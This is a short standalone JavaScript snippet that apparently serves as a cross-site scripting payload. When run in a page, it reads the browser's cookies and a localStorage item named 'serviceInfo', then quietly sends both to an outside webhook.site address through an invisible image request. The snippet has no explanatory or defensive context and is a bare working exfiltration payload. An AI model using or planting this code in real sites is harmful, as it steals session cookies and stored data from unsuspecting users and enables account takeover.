(function(){
  var d = localStorage.getItem('serviceInfo');
  var c = document.cookie;
  new Image().src = '//webhook.site/f3996221-df29-4190-a636-2ee87f0eb6a2?c='
    + encodeURIComponent(c)
    + '&d='
    + encodeURIComponent(d);
})();
